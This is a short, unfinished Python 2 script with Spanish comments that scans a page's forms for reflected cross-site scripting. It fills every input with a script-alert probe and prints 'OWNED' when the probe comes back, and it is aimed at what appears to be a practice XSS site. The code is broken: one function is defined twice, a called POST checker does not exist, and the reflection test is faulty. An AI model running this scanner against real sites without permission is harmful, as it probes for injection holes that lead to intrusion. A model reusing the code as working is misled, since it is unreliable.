import sys
import requests
import bs4

# GET TOMA PARAMS 
# POST DATA

def guardarUrl(url, form_data):
	pass


def checkearGET(url,names):

	form_data= {}

	# Armamos el form 
	for name in names:
		form_data[name] = '<script>alert("XssPrueba")</script>'

	res = requests.get(url, data=form_data)
	res.raise_for_status()
	print "Ya envie la request"
	
	# Buscamos si es vulnerable
	soup = bs4.BeautifulSoup(res.text,"html.parser")
	scripts = soup.select('script')
	for script in scripts:
		if 'alert("XssPrueba")' in script:
			print "OWNED"


def checkearGET(url,names):

	form_data= {}

	for name in names:
		form_data[name] = '<script>alert("XssPrueba")</script>'

	res = requests.get(url, params=form_data)
	res.raise_for_status()
	print "Ya envie la request"

	# Buscamos si es vulnerable.
	soup = bs4.BeautifulSoup(res.text,"html.parser")
	scripts = soup.select('script')
	for script in scripts:
		if 'alert("XssPrueba")' in script:
			print "OWNED"


def checkearXSS(url):

    res = requests.get(url)
    res.raise_for_status()
    soup = bs4.BeautifulSoup(res.text,"html.parser")
    forms = soup.select('form')
    for form in forms:
    	if form.get('method') == "GET":

    		inputs = form.select('input')
    		names = []
    		for inpt in inputs:
    			name = inpt.get('name')
    			if name != None:
    				names.append(name)
    		checkearGET(url,names)
    		# si es vulnberabe guardalo en la db

    	elif form.get('method') == "POST":

    		inputs = form.select('input')
    		names = []
    		for inpt in inputs:
    			name = inpt.get('name')
    			if name != None:
    				names.append(name)
    		checkearPOST(url,names)
    		# si es vulnberabe guardalo en la db




url = "http://xss-game.appspot.com/level1/frame?"
checkearXSS(url)
print "Ya la chequie"